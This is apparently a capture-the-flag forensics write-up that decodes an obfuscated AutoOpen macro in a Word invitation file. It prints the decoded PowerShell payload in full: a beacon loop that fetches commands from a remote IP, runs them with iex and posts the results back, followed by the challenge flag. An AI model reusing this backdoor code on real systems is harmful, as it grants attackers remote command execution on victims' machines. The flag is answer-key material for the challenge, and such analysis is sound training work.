# forensics_halloween_invitation (3)

We have a nice `invitation.docm`

There is some Macro in there !
- `invitation.docm` > `Project` > `Document Objects` > `ThisDocument` > `AutoOpen`
- `invitation.docm` > `Project` > `Modules` > `Module1` > `uxdufnkjlialsyp`

The functions/variables names were randomized, so we renamed them to understand what it does ! \
We understand the `uxdufnkjlialsyp` function is a decoder for some strings. \
We got these two files: [AutoOpen](./AutoOpen.vba) / [decoder](./decoder.vba)

Basically, the original script writes some malicious code inside a hidden window.

It takes some string in input, decode them as hexadecimal chars. Which themselves are decimal chars. The overall string gives a base64 encoded string.

We write the [decoder](./decoder.py) for the whole challenge, which gives:
```bash
python decoder.py | base64 -d
```

```
$s='77.74.198.52:8080';$i='d43bcc6d-043f2409-7ea23a2c';$p='http://';$v=Invoke-RestMethod -UseBasicParsing -Uri $p$s/d43bcc6d -Headers @{"Authorization"=$i};while ($true){$c=(Invoke-RestMethod -UseBasicParsing -Uri $p$s/043f2409 -Headers @{"Authorization"=$i});if ($c -ne 'None') {$r=iex $c -ErrorAction Stop -ErrorVariable e;$r=Out-String -InputObject $r;$t=Invoke-RestMethod -Uri $p$s/7ea23a2c -Method POST -Headers @{"Authorization"=$i} -Body ([System.Text.Encoding]::UTF8.GetBytes($e+$r) -join ' ')} sleep 0.8}HTB{5up3r_345y_m4cr05}
```

With the flag inside:
```
HTB{5up3r_345y_m4cr05}
```
